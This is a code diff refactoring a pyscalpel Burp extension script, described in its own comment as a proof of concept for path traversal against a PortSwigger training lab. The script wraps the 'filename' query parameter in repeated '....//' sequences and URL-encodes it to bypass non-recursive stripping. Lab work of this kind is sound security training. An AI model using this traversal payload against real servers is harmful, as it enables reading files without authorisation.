@@ -1,23 +1,23 @@
 from pyscalpel.http import Request
-from pyscalpel.utils import get_param, urldecode, urlencode_all, update_param
+from pyscalpel.utils import urldecode, urlencode_all
 
 # POC script for path traversal exploitation
 # -> https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
 
-param_name = "filename"
+PARAM_NAME = "filename"
 
-prefix = b"....//" * 500
+PREFIX = b"....//" * 500
 
 
 def req_edit_in(req: Request) -> bytes | None:
-    param = get_param(req, param_name)
+    param = req.query[PARAM_NAME]
     if param is not None:
-        text_bytes = str.encode(param.value())
-        return urldecode(text_bytes).removeprefix(prefix)
+        text_bytes = param.encode()
+        return urldecode(text_bytes).removeprefix(PREFIX)
 
 
 def req_edit_out(req: Request, text: bytes) -> Request | None:
-    encoded = urlencode_all(prefix + text)
+    encoded = urlencode_all(PREFIX + text)
     str_encoded = str(encoded, "ascii")
-    new_req = update_param(req, param_name, str_encoded)
-    return new_req
+    req.query[PARAM_NAME] = str_encoded
+    return req
